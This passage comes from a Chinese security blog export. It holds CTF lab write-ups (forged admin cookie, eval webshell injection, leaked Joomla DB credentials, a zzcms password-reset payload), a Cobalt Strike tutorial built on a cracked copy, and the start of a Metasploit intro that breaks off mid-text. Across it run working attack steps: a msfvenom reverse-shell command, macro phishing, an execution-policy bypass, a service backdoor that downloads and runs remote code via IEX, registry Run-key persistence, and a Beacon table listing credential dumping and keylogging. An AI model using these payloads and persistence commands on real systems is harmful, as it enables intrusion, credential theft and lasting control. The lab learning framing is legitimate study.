rel=\"noopener\">任意登录</a>，并且可以getshell</p>\n<p>使用文章中的万能cookie访问admin.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ebak_loginebakckpass:119770adb578053dcb383f67a81bcbc6 </span><br><span class=\"line\">ebak_bakrnd:35y5cCnnA4Kh </span><br><span class=\"line\">ebak_bakusername:admin </span><br><span class=\"line\">ebak_baklogintime:4070883661</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817224428.png\" alt=\"\"></p>\n<p>继续按照文章中的方法getshell</p>\n<p>备份数据到safemod</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817224821.png\" alt=\"\"></p>\n<p>到管理备份目录打包下载，这里备份后的safemod目录下所有的表都是以PHP保存的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817224926.png\" alt=\"\"></p>\n<p>本来可以下载看到备份文件的内容，但ichunqiu的内网靶机看不了，就直接看文章中的吧</p>\n<p>例如它的文件格式会是：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $b_table&#x3D;&quot;ecs_ad_custom&quot;;</span><br><span class=\"line\">    $tb[ecs_ad_custom]&#x3D;1;</span><br><span class=\"line\"></span><br><span class=\"line\">    $b_baktype&#x3D;0;</span><br><span class=\"line\">    $b_filesize&#x3D;300;</span><br><span class=\"line\">    $b_bakline&#x3D;500;</span><br><span class=\"line\">    $b_autoauf&#x3D;1;</span><br><span class=\"line\">    $b_dbname&#x3D;&quot;test&quot;;</span><br><span class=\"line\">    $b_stru&#x3D;1;</span><br><span class=\"line\">    $b_strufour&#x3D;0;</span><br><span class=\"line\">    $b_dbchar&#x3D;&quot;auto&quot;;</span><br><span class=\"line\">    $b_beover&#x3D;0;</span><br><span class=\"line\">    $b_insertf&#x3D;&quot;replace&quot;;</span><br><span class=\"line\">    $b_autofield&#x3D;&quot;,,&quot;;</span><br><span class=\"line\">    $b_bakdatatype&#x3D;0;</span><br><span class=\"line\">    ?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>将字符: <code>$b_bakdatatype=0;</code>替换为: <code>$b_bakdatatype=0;eval($_POST[&#39;a&#39;]);</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817225448.png\" alt=\"\"></p>\n<p>再用菜刀连接bdata/safemod/config.php，成功getshell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817225623.png\" alt=\"\"></p>\n<p>得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817225748.png\" alt=\"\"></p>\n<h3 id=\"信息泄露\"><a href=\"#信息泄露\" class=\"headerlink\" title=\"信息泄露\"></a>信息泄露</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818135541.png\" alt=\"\"></p>\n<p>Joomla，扫个目录，有后台还有phpmyadmin页面，但后台登录就500，只有尝试爆破phpmyadmin，无果</p>\n<p>然后瞄wp，说是原题有个提示，可以下载到网站的源码，目录下有个configuration.php文件，直接请求下吧</p>\n<p>configuration.php空白，加个~泄露出了文件信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class JConfig &#123;</span><br><span class=\"line\">\tpublic $offline &#x3D; &#39;0&#39;;</span><br><span class=\"line\">\tpublic $offline_message &#x3D; &#39;This site is down for maintenance.&lt;br &#x2F;&gt; Please check back again soon.&#39;;</span><br><span class=\"line\">\tpublic $display_offline_message &#x3D; &#39;1&#39;;</span><br><span class=\"line\">\tpublic $offline_image &#x3D; &#39;&#39;;</span><br><span class=\"line\">\tpublic $sitename &#x3D; &#39;web2&#39;;</span><br><span class=\"line\">\tpublic $editor &#x3D; &#39;tinymce&#39;;</span><br><span class=\"line\">\tpublic $captcha &#x3D; &#39;0&#39;;</span><br><span class=\"line\">\tpublic $list_limit &#x3D; &#39;20&#39;;</span><br><span class=\"line\">\tpublic $access &#x3D; &#39;1&#39;;</span><br><span class=\"line\">\tpublic $debug &#x3D; &#39;0&#39;;</span><br><span class=\"line\">\tpublic $debug_lang &#x3D; &#39;0&#39;;</span><br><span class=\"line\">\tpublic $dbtype &#x3D; &#39;mysqli&#39;;</span><br><span class=\"line\">\tpublic $host &#x3D; &#39;localhost&#39;;</span><br><span class=\"line\">\tpublic $user &#x3D; &#39;root&#39;;</span><br><span class=\"line\">\tpublic $password &#x3D; &#39;9550bef955f9&#39;;</span><br><span class=\"line\">\tpublic $db &#x3D; &#39;web&#39;;</span><br><span class=\"line\">\tpublic $dbprefix &#x3D; &#39;m9w42_&#39;;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>可以看到直接给了mysql的数据库，用户名，密码等信息，这样就可以登录phpmyadmin了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818145408.png\" alt=\"\"></p>\n<p>在web中找到joomla管理员后台的密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818150007.png\" alt=\"\"></p>\n<p>但可能环境有问题还是500登不上去，pass吧，看了下wp后面是登录进去之后可以编辑模板插入一句话木马，提交之后根据标题提示，用菜刀连接<code>template/atomic/index.php</code>即可getshell</p>\n<h3 id=\"代码执行\"><a href=\"#代码执行\" class=\"headerlink\" title=\"代码执行\"></a>代码执行</h3><p>又是个discuz</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818152548.png\" alt=\"\"></p>\n<p>依旧扫后台，爆破走一套</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818152745.png\" alt=\"\"></p>\n<p>其他没啥，robots.txt爆出了一些文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818153246.png\" alt=\"\"></p>\n<p>待续。。。</p>\n<h3 id=\"session欺骗\"><a href=\"#session欺骗\" class=\"headerlink\" title=\"session欺骗\"></a>session欺骗</h3><p>首页底部得知是zzcms并且后台管理入口就在底部</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818184938.png\" alt=\"\"></p>\n<p>密码不知道，扫一波目录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818185512.png\" alt=\"\"></p>\n<p>并且这些目录都是有查看权限的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818185637.png\" alt=\"\"></p>\n<p>百度到了一个<a href=\"https://www.seebug.org/vuldb/ssvid-97130\" target=\"_blank\" rel=\"noopener\">任意用户密码修改漏洞</a>，试下</p>\n<p>首先抓包/admin/ZC_Password请求，改成post请求，再在body处加上payload：<code>name=admin&amp;newpass=123333&amp;newpass1=123333&amp;&amp;submit=%E7%99%BB+%E5%BD%95</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818190340.png\" alt=\"\"></p>\n<p>发包，成功登录后台</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818190452.png\" alt=\"\"></p>\n<p>左侧找到添加下载，可以上传一句话木马，并直接返回了路径</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818190854.png\" alt=\"\"></p>\n<p>那么直接上菜刀，getshell，flag在html目录下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818191055.png\" alt=\"\"></p>\n","categories":["ichunqiu综合渗透练习"]},{"title":"cobalt_strike基本使用","url":"/2020/09/27/cs_learn_note/","content":"<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>百度的汉化破解版，<a href=\"https://www.nctry.com/1744.html\" target=\"_blank\" rel=\"noopener\">源地址</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927082243.png\" alt=\"\"></p>\n<p>下载下来可以看到有挺多文件，但我们只需要关注两个文件即可，start和teamserver</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927082403.png\" alt=\"\"></p>\n<p>简单介绍下，Cobalt Strike是一款基于java的渗透测试工具，也就是经常在大佬文章中出现的称为CS的神器。它分为客户端和服务端，服务端的关键文件是teamserver和cobaltstrike.jar，而客户端只需在主机上执行start，然后连接服务端即可，通过这种模式，多个客户端可以连接到一个服务端，使得团队成员之间可以共享攻击资源与目标信息和sessions，提升效率。</p>\n<p>这里演示下连接效果，以linux服务端为例（当然windows也可以，上面我们可以看到作者已经给我们创建好了bat文件）</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927085932.png\" alt=\"\"></p>\n<p>查看本机ip地址，执行命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.&#x2F;teamserver ip password #password自定义</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927090150.png\" alt=\"\"></p>\n<p>客户端运行start.bat，填写相应连接信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927090514.png\" alt=\"\"></p>\n<p>点击连接，成功上线</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927090609.png\" alt=\"\"></p>\n<h3 id=\"基本使用\"><a href=\"#基本使用\" class=\"headerlink\" title=\"基本使用\"></a>基本使用</h3><p>已经是中文版，就方便很多了，这里实践一下百度的一些常用方法</p>\n<p>参考:<a href=\"https://blog.csdn.net/weixin_44677409/article/details/102725129\" target=\"_blank\" rel=\"noopener\">1</a>，<a href=\"https://www.freebuf.com/vuls/224507.html\" target=\"_blank\" rel=\"noopener\">2</a>，<a href=\"https://blog.csdn.net/weixin_44677409/article/details/102725418\" target=\"_blank\" rel=\"noopener\">3</a></p>\n<h4 id=\"上线肉鸡\"><a href=\"#上线肉鸡\" class=\"headerlink\" title=\"上线肉鸡\"></a>上线肉鸡</h4><h5 id=\"创建监听器\"><a href=\"#创建监听器\" class=\"headerlink\" title=\"创建监听器\"></a>创建监听器</h5><p>Cobalt Strike–&gt;监听器–&gt;add–&gt;save</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927092754.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927092928.png\" alt=\"\"></p>\n<h5 id=\"生成木马\"><a href=\"#生成木马\" class=\"headerlink\" title=\"生成木马\"></a>生成木马</h5><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927093743.png\" alt=\"\"></p>\n<p>方式选择powershell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094219.png\" alt=\"\"></p>\n<p>Generate生成</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094313.png\" alt=\"\"></p>\n<h5 id=\"生成web链接\"><a href=\"#生成web链接\" class=\"headerlink\" title=\"生成web链接\"></a>生成web链接</h5><p>用刚刚生成的文件生成下载链接</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094522.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094754.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094817.png\" alt=\"\"></p>\n<h5 id=\"运行木马\"><a href=\"#运行木马\" class=\"headerlink\" title=\"运行木马\"></a>运行木马</h5><p>在目标主机上运行mshta命令。mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927095101.png\" alt=\"\"></p>\n<p>回车，返回Cobalt Strike即可看见肉鸡成功上线</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927095156.png\" alt=\"\"></p>\n<p>点击进入beacon使用shell+命令即可执行交互</p>\n<p>这里借用一下<a href=\"https://blog.csdn.net/weixin_44677409/article/details/102725129\" target=\"_blank\" rel=\"noopener\">大佬</a>的命令表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Beacon Commands</span><br><span class=\"line\">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\"></span><br><span class=\"line\">    Command                   Description</span><br><span class=\"line\">    -------                   -----------</span><br><span class=\"line\">    argue                     进程参数欺骗</span><br><span class=\"line\">    blockdlls                 在子进程中阻止非Microsoft的DLLs文件</span><br><span class=\"line\">    browserpivot              注入受害者浏览器进程</span><br><span class=\"line\">    bypassuac                 绕过UAC</span><br><span class=\"line\">    cancel                    取消正在进行的下载</span><br><span class=\"line\">    cd                        切换目录</span><br><span class=\"line\">    checkin                   强制让被控端回连一次</span><br><span class=\"line\">    clear                     清除beacon内部的任务队列</span><br><span class=\"line\">    connect                   通过TCP连接到Beacon</span><br><span class=\"line\">    covertvpn                 部署Covert VPN客户端</span><br><span class=\"line\">    cp                        复制文件</span><br><span class=\"line\">    dcsync                    从DC中提取密码哈希</span><br><span class=\"line\">    desktop                   远程VNC</span><br><span class=\"line\">    dllinject                 反射DLL注入进程</span><br><span class=\"line\">    dllload                   使用LoadLibrary将DLL加载到进程中</span><br><span class=\"line\">    download                  下载文件</span><br><span class=\"line\">    downloads                 列出正在进行的文件下载</span><br><span class=\"line\">    drives                    列出目标盘符</span><br><span class=\"line\">    elevate                   尝试提权</span><br><span class=\"line\">    execute                   在目标上执行程序(无输出)</span><br><span class=\"line\">    execute-assembly          在目标上内存中执行本地.NET程序</span><br><span class=\"line\">    exit                      退出beacon</span><br><span class=\"line\">    getprivs                  对当前令牌启用系统权限</span><br><span class=\"line\">    getsystem                 尝试获取SYSTEM权限</span><br><span class=\"line\">    getuid                    获取用户ID</span><br><span class=\"line\">    hashdump                  转储密码哈希值</span><br><span class=\"line\">    help                      帮助</span><br><span class=\"line\">    inject                    在特定进程中生成会话</span><br><span class=\"line\">    jobkill                   杀死一个后台任务</span><br><span class=\"line\">    jobs                      列出后台任务</span><br><span class=\"line\">    kerberos_ccache_use       从ccache文件中导入票据应用于此会话</span><br><span class=\"line\">    kerberos_ticket_purge     清除当前会话的票据</span><br><span class=\"line\">    kerberos_ticket_use       从ticket文件中导入票据应用于此会话</span><br><span class=\"line\">    keylogger                 键盘记录</span><br><span class=\"line\">    kill                      结束进程</span><br><span class=\"line\">    link                      通过命名管道连接到Beacon</span><br><span class=\"line\">    logonpasswords            使用mimikatz转储凭据和哈希值</span><br><span class=\"line\">    ls                        列出文件</span><br><span class=\"line\">    make_token                创建令牌以传递凭据</span><br><span class=\"line\">    mimikatz                  运行mimikatz</span><br><span class=\"line\">    mkdir                     创建一个目录</span><br><span class=\"line\">    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class=\"line\">    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class=\"line\">    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class=\"line\">    mode http                 使用HTTP作为通信通道</span><br><span class=\"line\">    mv                        移动文件</span><br><span class=\"line\">    net                       net命令</span><br><span class=\"line\">    note                      给当前目标机器备注       </span><br><span class=\"line\">    portscan                  进行端口扫描</span><br><span class=\"line\">    powerpick                 通过Unmanaged PowerShell执行命令</span><br><span class=\"line\">    powershell                通过powershell.exe执行命令</span><br><span class=\"line\">    powershell-import         导入powershell脚本</span><br><span class=\"line\">    ppid                      为生成的post-ex任务设置父PID</span><br><span class=\"line\">    ps                        显示进程列表</span><br><span class=\"line\">    psexec                    使用服务在主机上生成会话</span><br><span class=\"line\">    psexec_psh                使用PowerShell在主机上生成会话</span><br><span class=\"line\">    psinject                  在特定进程中执行PowerShell命令</span><br><span class=\"line\">    pth                       使用Mimikatz进行传递哈希</span><br><span class=\"line\">    pwd                       当前目录位置</span><br><span class=\"line\">    reg                       查询注册表</span><br><span class=\"line\">    rev2self                  恢复原始令牌</span><br><span class=\"line\">    rm                        删除文件或文件夹</span><br><span class=\"line\">    rportfwd                  端口转发</span><br><span class=\"line\">    run                       在目标上执行程序(返回输出)</span><br><span class=\"line\">    runas                     以另一个用户权限执行程序</span><br><span class=\"line\">    runasadmin                在高权限下执行程序</span><br><span class=\"line\">    runu                      在另一个PID下执行程序</span><br><span class=\"line\">    screenshot                屏幕截图</span><br><span class=\"line\">    setenv                    设置环境变量</span><br><span class=\"line\">    shell                     cmd执行命令</span><br><span class=\"line\">    shinject                  将shellcode注入进程</span><br><span class=\"line\">    shspawn                   生成进程并将shellcode注入其中</span><br><span class=\"line\">    sleep                     设置睡眠延迟时间</span><br><span class=\"line\">    socks                     启动SOCKS4代理</span><br><span class=\"line\">    socks stop                停止SOCKS4</span><br><span class=\"line\">    spawn                     生成一个会话 </span><br><span class=\"line\">    spawnas                   以其他用户身份生成会话</span><br><span class=\"line\">    spawnto                   将可执行程序注入进程</span><br><span class=\"line\">    spawnu                    在另一个PID下生成会话</span><br><span class=\"line\">    ssh                       使用ssh连接远程主机</span><br><span class=\"line\">    ssh-key                   使用密钥连接远程主机</span><br><span class=\"line\">    steal_token               从进程中窃取令牌</span><br><span class=\"line\">    timestomp                 将一个文件时间戳应用到另一个文件</span><br><span class=\"line\">    unlink                    断开与Beacon的连接</span><br><span class=\"line\">    upload                    上传文件</span><br><span class=\"line\">    wdigest                   使用mimikatz转储明文凭据</span><br><span class=\"line\">    winrm                     使用WinRM在主机上生成会话</span><br><span class=\"line\">    wmi                       使用WMI在主机上生成会话</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927095923.png\" alt=\"\"></p>\n<h4 id=\"socks代理\"><a href=\"#socks代理\" class=\"headerlink\" title=\"socks代理\"></a>socks代理</h4><p>开启sock代理</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927101318.png\" alt=\"\"></p>\n<p>主机配置proxychains.conf</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927101306.png\" alt=\"\"></p>\n<p>nmap扫描内网存活主机</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927101725.png\" alt=\"\"></p>\n<h4 id=\"Metasploit联动\"><a href=\"#Metasploit联动\" class=\"headerlink\" title=\"Metasploit联动\"></a>Metasploit联动</h4><h5 id=\"CS木马msf监听\"><a href=\"#CS木马msf监听\" class=\"headerlink\" title=\"CS木马msf监听\"></a>CS木马msf监听</h5><p>msf开启监听</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927105130.png\" alt=\"\"></p>\n<p>Cobalt Strike上创建两个监听器，windows/beacon_http/reverse_http来监听肉鸡，windows/foreign/reverse_http来将获取到的控制权传给msf(端口与msf监听的端口一致)</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927105650.png\" alt=\"\"></p>\n<p>选择foreign监听器生成木马在主机上执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927110336.png\" alt=\"\"></p>\n<p>主机上执行可以看到成功获取会话</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927110621.png\" alt=\"\"></p>\n<p>但就像博主说的，会话极其不稳定，马上就断开了</p>\n<h5 id=\"msf生成木马CS监听\"><a href=\"#msf生成木马CS监听\" class=\"headerlink\" title=\"msf生成木马CS监听\"></a>msf生成木马CS监听</h5><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.126.128 lport&#x3D;6666 -f exe -o msf.exe</span><br></pre></td></tr></table></figure>\n\n<p>cs生成链接</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927111407.png\" alt=\"\"></p>\n<p>目标主机访问链接运行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927111710.png\" alt=\"\"></p>\n<p>返回msf可以看到已经获取会话</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927111800.png\" alt=\"\"></p>\n<h4 id=\"宏钓鱼\"><a href=\"#宏钓鱼\" class=\"headerlink\" title=\"宏钓鱼\"></a>宏钓鱼</h4><p>选择office方式</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927144456.png\" alt=\"\"></p>\n<p>点击生成之后弹出提示框告诉我们步骤</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927144601.png\" alt=\"\"></p>\n<p>首先随便打开一个word或者office，查看macros</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927144814.png\" alt=\"\"></p>\n<p>随意命名，打开到this document，回到cs复制macro，粘贴</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145103.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145149.png\" alt=\"\"></p>\n<p>关闭另存为启用宏的word文档</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145247.png\" alt=\"\"></p>\n<p>目标主机打开这个带有恶意宏的文档即可上线</p>\n<h4 id=\"shellcode\"><a href=\"#shellcode\" class=\"headerlink\" title=\"shellcode\"></a>shellcode</h4><p>CS支持生成多种语言的shellcode</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145749.png\" alt=\"\"></p>\n<p>比如powershell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145926.png\" alt=\"\"></p>\n<p>将payload.ps1复制到目标系统并执行以下命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &#39;C:\\payload.ps1&#39;&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927150144.png\" alt=\"\"></p>\n<p>返回CS即可看到返回会话</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927150217.png\" alt=\"\"></p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>CS内置两个exp</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927150616.png\" alt=\"\"></p>\n<p>通过<a href=\"https://github.com/rsmudge/ElevateKit\" target=\"_blank\" rel=\"noopener\">项目</a>可以导入脚本文件来扩展漏洞库，点击Cobalt Strike中的脚本管理器，点击load加载下来的cna文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927150958.png\" alt=\"\"></p>\n<p>选择相应的exp即可尝试提权</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927151052.png\" alt=\"\"></p>\n<h3 id=\"权限维持\"><a href=\"#权限维持\" class=\"headerlink\" title=\"权限维持\"></a>权限维持</h3><p>目的是即使目标主机重启，依旧能保持目标的控制权</p>\n<h5 id=\"设置服务后门\"><a href=\"#设置服务后门\" class=\"headerlink\" title=\"设置服务后门\"></a>设置服务后门</h5><p>生成一个服务器的恶意脚本</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927151551.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927151649.png\" alt=\"\"></p>\n<p>复制生成的命令在目标主机上执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927151825.png\" alt=\"\"></p>\n<p>返回同样上线主机，但只有普通用户的权限，因此想要完成以下的操作需要提权，我这里因为是虚拟机，直接管理员运行了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927152932.png\" alt=\"\"></p>\n<p>打开beacon shell并执行命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">shell sc create &quot;blacknight&quot; binpath&#x3D; &quot;cmd &#x2F;c start powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.183.148:80&#x2F;a&#39;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153143.png\" alt=\"\"></p>\n<p>执行成功，这时查看目标主机的服务信息发现一个名为blacknight的服务已经创建了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153253.png\" alt=\"\"></p>\n<p>但还是手动的，因此我们需要把他设为自动</p>\n<p>执行命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">shell sc config &quot;name&quot; start&#x3D; auto</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153402.png\" alt=\"\"></p>\n<p>这是再返回主机查看可以看到已经变成自动的了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153453.png\" alt=\"\"></p>\n<p>这样就设置好了一个服务后门。</p>\n<h5 id=\"设置注册表后门\"><a href=\"#设置注册表后门\" class=\"headerlink\" title=\"设置注册表后门\"></a>设置注册表后门</h5><p>首先在CS上生成一个恶意可执行文件上传到服务器上</p>\n<p>右键打开文件管理</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153949.png\" alt=\"\"></p>\n<p>点击下方的upload将恶意文件上传到主机上</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927154045.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927154026.png\" alt=\"\"></p>\n<p>执行命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">shell reg add HKLM_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run &#x2F;v &quot;keyname&quot; &#x2F;t REG_SZ &#x2F;d &quot;C:\\Users\\15363\\Desktop\\artifact.exe&quot; &#x2F;f</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927154224.png\" alt=\"\"></p>\n<p>打开主机注册表编辑器可以看到已经写入成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927155036.png\" alt=\"\"></p>\n<p>就跟着做到这里吧，总算是熟悉了一下会用了，以后有啥高级用法另开。</p>\n","categories":["渗透测试"],"tags":["cobaltstrike"]},{"title":"metasploit基础扫描","url":"/2020/07/22/msf_note1/","content":"<p>缓缓拿起桌上当了几个月垫子的metasploit渗透测试指南。</p>\n<a id=\"more\"></a>\n\n<h3 id=\"Metasploit的一些术语\"><a href=\"#Metasploit的一些术语\" class=\"headerlink\" title=\"Metasploit的一些术语\"></a>Metasploit的一些术语</h3><p>渗透攻击exploit：攻击者或渗透攻击者利用系统、应用或服务中的安全漏洞所进行的攻击行为<br>攻击载荷payload：我们期望目标系统在被渗透攻击之后去执行的代码，在Metasploit框架中可以自由的选择、传送和植入<br>shellcode：在渗透攻击时作为攻击载荷运行的由汇编语言编写的一组机器指令<br>模块(Module)：一个模块是指Metasploit框架中所使用的一段软件代码组件<br>监听器(Listener)：Metasploit中用来等待连入网络连接的组件</p>\n<h3 id=\"Metasploit功能程序\"><a href=\"#Metasploit功能程序\" class=\"headerlink\" title=\"Metasploit功能程序\"></a>Metasploit功能程序</h3><h4 id=\"MSF攻击载荷生成器\"><a href=\"#MSF攻击载荷生成器\" class=\"headerlink\" title=\"MSF攻击载荷生成器\"></a>MSF攻击载荷生成器</h4><p>MSF攻击载荷生成器允许你能够生成shellcode、可执行代码和其他更多，也可以让它们在框架软件之外的渗透代码中进行使用。2015年开始Metasploit弃用了早期版本的msfpayload，转而使用集成了攻击载荷生成和编码的msfvenom替代</p>\n<p>查看msfvenom配置选项命令是：msfvenom -h</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722222447.png\" alt=\"\"></p>\n<h4 id=\"MSF编码器\"><a href=\"#MSF编码器\" class=\"headerlink\" title=\"MSF编码器\"></a>MSF编码器</h4><p>Metasploit中包含了一系列可用于不同场景下的编码器，一些编码器在你只能使用字母和数字字符来构造攻击载荷时非常有用。在2015年之后的版本，msfpayload和msfencode被一起弃用，编码的功能也一同集成于msfvenom。</p>\n<p>如果需要查看有哪些可用的编码器以及他们的等级，可以使用命令：msfvenom -l encoders</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722223442.png\" alt=\"\"></p>\n<h4 id=\"Nasm-shell\"><a href=\"#Nasm-shell\" class=\"headerlink\" title=\"Nasm shell\"></a>Nasm shell</h4><p>Nasm_shell.rb是一个帮助我们了解汇编代码含义的功能程序，比如我们可以运行程序请求汇编命令的opcode操作码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722223927.png\" alt=\"\"></p>\n<h3 